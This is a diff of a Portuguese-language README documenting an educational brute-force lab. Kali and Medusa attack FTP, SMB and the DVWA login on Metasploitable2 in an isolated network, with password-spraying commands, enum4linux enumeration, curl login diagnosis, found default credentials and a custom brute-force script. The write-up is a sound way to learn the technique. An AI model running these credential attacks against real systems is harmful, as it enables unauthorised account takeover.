@@ -1,8 +1,8 @@
 # Brute Force Lab — Medusa + Metasploitable2 + DVWA
 
-Projeto prático de simulação de ataques de força bruta em ambiente controlado, utilizando **Kali Linux** e **Medusa** contra serviços vulneráveis do **Metasploitable2** e do **DVWA (Damn Vulnerable Web App)**.
+Projeto prático de simulação de ataques de força bruta em ambiente controlado, utilizando Kali Linux e Medusa contra serviços vulneráveis do Metasploitable2 e do DVWA (Damn Vulnerable Web App).
 
-> Projeto feito **exclusivamente em laboratório isolado (rede host-only)**, para fins educacionais. Nenhuma técnica aqui deve ser aplicada contra sistemas sem autorização explícita.
+> Projeto feito exclusivamente em laboratório isolado (rede host-only), para fins educacionais. Nenhuma técnica aqui deve ser aplicada contra sistemas sem autorização explícita.
 
 ## Objetivo
 
@@ -15,7 +15,7 @@ Compreender e demonstrar na prática ataques de força bruta em diferentes servi
 | Kali Linux | 10.0.2.15 | Atacante |
 | Metasploitable2 | 10.0.2.3 | Alvo vulnerável |
 
-Rede configurada em modo **Host-only** no VirtualBox, isolando o laboratório da rede externa.
+Rede configurada em modo Host-only no VirtualBox, isolando o laboratório da rede externa.
 
 ## Reconhecimento (Nmap)
 
@@ -27,10 +27,12 @@ Principais portas relevantes para o teste:
 
 ```
 21/tcp    open  ftp         vsftpd 2.3.4
-80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)   → DVWA
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)   -> DVWA
 139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 ```
+
+Ver `images/01-nmap-scan.png`.
 
 ## Construção das Wordlists
 
@@ -47,20 +49,36 @@ cat parte_aa <(echo -e "msfadmin\nuser\npostgres\nservice\n123456\npassword") pa
 awk '!seen[$0]++' lowsenhas.txt > lowsenhas-final.txt
 ```
 
-Resultado: `lowusers.txt` (54 entradas) e `lowsenhas.txt` (156 entradas).
+Resultado: `lowusers.txt` (54 entradas) e `lowsenhas.txt` (156 entradas), com as credenciais conhecidas verificadamente posicionadas no meio dos arquivos (ex: `msfadmin` na linha 26 de 54, e na linha 76 de 156).
+
+Arquivos em [`wordlists/`](./wordlists).
 
 ## Ataque 1 — FTP (Medusa)
 
 ```bash
-medusa -h 10.0.2.3 -U lowusers.txt -P lowsenhas.txt -M ftp -t 10
+medusa -h 10.0.2.3 -U wordlists/lowusers.txt -P wordlists/lowsenhas.txt -M ftp -t 10 | tee wordlists/ftp-output-full.txt | grep "SUCCESS"
 ```
 
-**Resultado:** _[preencher com o ACCOUNT FOUND do seu log]_
+Resultado:
 
-**Validação manual:**
+```
+ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: user Password: user [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: postgres Password: postgres [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 10.0.2.3 User: service Password: service [SUCCESS]
+```
+
+Quatro contas com credenciais fracas/padrão identificadas no serviço FTP.
+
+Validação manual:
+
 ```bash
 ftp 10.0.2.3
 ```
+
+Login confirmado com `msfadmin:msfadmin`, com acesso de leitura ao diretório remoto (`ls` retornando conteúdo real).
+
+Ver `images/04-ftp-medusa-ataque.png`, `images/05-ftp-account-found.png` e `images/06-ftp-login-manual.png`.
 
 ## Ataque 2 — SMB (Enumeração + Password Spraying)
 
@@ -70,31 +88,44 @@ ftp 10.0.2.3
 enum4linux -U 10.0.2.3
 ```
 
-A Samba do alvo permitiu **sessão nula** (`username ''`, `password ''`), expondo a lista completa de usuários do sistema sem autenticação — uma falha de configuração relevante.
+A Samba do alvo permitiu sessão nula (`username ''`, `password ''`), expondo a lista completa de usuários do sistema sem autenticação — uma falha de configuração relevante.
 
 ```bash
-grep "user:\[" enum4linux-output.txt | awk -F'[][]' '{print $2}' > smb-users.txt
+grep "user:\[" enum4linux-output.txt | awk -F'[][]' '{print $2}' > wordlists/smb-users.txt
 ```
+
+Ver `images/07-smb-enum4linux.png`.
 
 ### Password Spraying
 
-Com a lista real de usuários extraída, aplicou-se **password spraying** (poucas senhas comuns testadas contra todos os usuários, ao invés de muitas senhas por usuário — abordagem que reduz o risco de lockout de conta):
+Com a lista real de usuários extraída, aplicou-se password spraying (poucas senhas comuns testadas contra todos os usuários, ao invés de muitas senhas por usuário — abordagem que reduz o risco de lockout de conta):
 
 ```bash
-medusa -h 10.0.2.3 -U smb-users.txt -P smb-passwords-spray.txt -M smbnt
+medusa -h 10.0.2.3 -U wordlists/smb-users.txt -P wordlists/smb-passwords-spray.txt -M smbnt
 ```
 
-**Resultado:**
+Resultado:
+
 ```
 ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: user Password: user [SUCCESS (ADMIN$ - Access Allowed)]
 ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
 ```
 
-**Validação manual:**
+Ver `images/08-smb-medusa-spray.png`.
+
+Validação manual:
+
 ```bash
 smbclient //10.0.2.3/ADMIN$ -U msfadmin
 ```
-Login confirmado com sucesso.
+
+A autenticação foi aceita, mas o compartilhamento `ADMIN$` negou a listagem de arquivos (`NT_STATUS_NETWORK_ACCESS_DENIED`) — uma distinção importante entre autenticação válida e autorização de acesso ao recurso. Testando o mesmo usuário contra o compartilhamento `tmp`, o acesso e a listagem de arquivos foram concedidos normalmente, confirmando a validade da credencial:
+
+```bash
+smbclient //10.0.2.3/tmp -U msfadmin
+```
+
+Ver `images/09-smb-login-manual.png`.
 
 ## Ataque 3 — DVWA (Login Web)
 
@@ -104,27 +135,71 @@ Login confirmado com sucesso.
 curl -s http://10.0.2.3/dvwa/login.php
 ```
 
-Campos identificados: `username`, `password`, botão `Login`. Sem token CSRF (`user_token`) presente no formulário — o que, em tese, simplifica o ataque automatizado.
+Campos identificados: `username`, `password`, botão `Login`. Sem token CSRF (`user_token`) presente no formulário. A própria tela de login expõe a dica "default username is 'admin' with password 'password'", uma informação sensível desnecessariamente exposta.
 
-Observação adicional: a própria tela de login expõe a dica **"default username is 'admin' with password 'password'"**, uma informação sensível desnecessariamente exposta.
+Ver `images/11-dvwa-form-html.png`.
 
 ### Tentativa com Medusa (módulo web-form)
 
 ```bash
-medusa -h 10.0.2.3 -u admin -P lowsenhas.txt -M web-form \
+medusa -h 10.0.2.3 -u admin -P wordlists/lowsenhas.txt -M web-form \
   -m FORM:"/dvwa/login.php" \
   -m DENY-SIGNAL:"Login failed" \
   -m FORM-DATA:"post?username=&password=&Login=Login" \
   -m CUSTOM-HEADER:"Cookie: PHPSESSID=<valor>; security=high"
 ```
 
-### Limitação encontrada
+O ataque retornou consistentemente erro HTTP 302 em todas as tentativas (`error code 302`), sem conseguir avaliar nenhuma credencial.
 
-O ataque retornou consistentemente **erro HTTP 302** (redirecionamento) em vez de processar o login. Causa provável: o Medusa reutiliza um único cookie de sessão estático durante todas as tentativas, mas o DVWA valida o nível de segurança (`security`) a partir do que está armazenado no banco de dados da aplicação, não apenas do cookie enviado — gerando descompasso entre o estado esperado pelo servidor e o cookie fixo fornecido pela ferramenta.
+Ver `images/13-dvwa-medusa-erro302.png`.
 
-Essa limitação é consistente com uma característica conhecida do Medusa: o módulo `web-form` não gerencia sessão dinamicamente (diferente de ferramentas como o Hydra ou Burp Suite Intruder), o que o torna menos adequado para aplicações web modernas dependentes de estado de sessão.
+### Diagnóstico da limitação
 
-**Conclusão:** o ataque foi corretamente modelado e configurado (formulário, campos e sinal de falha identificados corretamente), mas esbarrou em uma limitação técnica da ferramenta diante do gerenciamento de sessão do DVWA — um achado relevante sobre os limites práticos do Medusa em comparação a outras ferramentas de força bruta web.
+Para identificar a causa raiz, o comportamento do servidor foi testado manualmente com `curl`, mantendo um cookie de sessão entre requisições (cookie jar):
+
+```bash
+curl -s -c cookies.txt http://10.0.2.3/dvwa/login.php -o /dev/null
+
+curl -s -i -b cookies.txt -c cookies.txt -X POST http://10.0.2.3/dvwa/login.php \
+  -d "username=admin&password=senhaerrada&Login=Login" | grep -i "location\|http"
+
+curl -s -i -b cookies.txt -c cookies.txt -X POST http://10.0.2.3/dvwa/login.php \
+  -d "username=admin&password=password&Login=Login" | grep -i "location\|http"
+```
+
+Resultado:
+
+```
+HTTP/1.1 302 Found
+Location: login.php      (senha incorreta)
+
+HTTP/1.1 302 Found
+Location: index.php      (senha correta)
+```
+
+O DVWA sempre responde com HTTP 302 (padrão Post-Redirect-Get), nunca com HTTP 200 nessa rota. A diferença entre sucesso e falha está no cabeçalho `Location`, não no corpo da resposta. O módulo `web-form` do Medusa foi projetado para identificar sucesso/falha a partir de texto no corpo de uma resposta HTTP 200, o que explica por que ele falha de forma estrutural diante desse comportamento do DVWA — não se trata de erro de configuração do comando, mas de uma limitação da ferramenta diante desse padrão de aplicação web.
+
+Ver `images/12-dvwa-curl-diagnostico.png`.
+
+### Script próprio como alternativa
+
+Diante da limitação identificada, foi desenvolvido um script em Bash que reutiliza cookie de sessão corretamente entre tentativas e identifica sucesso pelo cabeçalho `Location`, reproduzindo a lógica de força bruta que o Medusa não conseguiu executar nesse cenário:
+
+```bash
+./brute-dvwa.sh
+```
+
+Código completo em [`brute-dvwa.sh`](./brute-dvwa.sh).
+
+Resultado:
+
+```
+[+] CREDENCIAL ENCONTRADA: admin:password
+```
+
+A credencial `admin:password` confirma a dica previamente observada na própria tela de login.
+
+Ver `images/14-dvwa-script-sucesso.png` e `images/15-dvwa-painel-logado.png`.
 
 ## Recomendações de Mitigação
 
@@ -142,4 +217,4 @@ Ver pasta [`/images`](./images) — prints dos comandos, outputs do Medusa e val
 
 ## Aprendizados
 
-_[espaço para suas reflexões pessoais sobre o processo, dificuldades e o que aprendeu]_
+*[espaço para reflexões pessoais sobre o processo, dificuldades e o que foi aprendido]*
